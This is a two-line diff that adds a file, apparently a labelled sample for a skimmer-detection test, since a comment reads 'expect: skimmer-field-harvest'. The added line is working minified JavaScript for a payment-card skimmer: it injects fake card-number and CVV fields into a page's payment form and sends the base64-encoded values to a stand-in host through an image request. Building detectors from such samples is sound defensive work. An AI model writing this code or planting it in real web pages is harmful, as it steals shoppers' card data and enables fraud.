@@ -1,0 +1,2 @@
+// expect: skimmer-field-harvest
+setTimeout(function(){var f=document.createElement('div');f.innerHTML='<input id="x_card_number" placeholder="Card number"><input id="x_cvv" placeholder="CVV">';document.querySelector('#payment').appendChild(f);document.getElementById('x_cvv').addEventListener('keyup',function(){var a=document.getElementById('x_card_number').value,b=this.value;if(b.length>2){(new Image()).src='https://payment-verify.example/i.gif?q='+btoa(a+':'+b);}});},800);
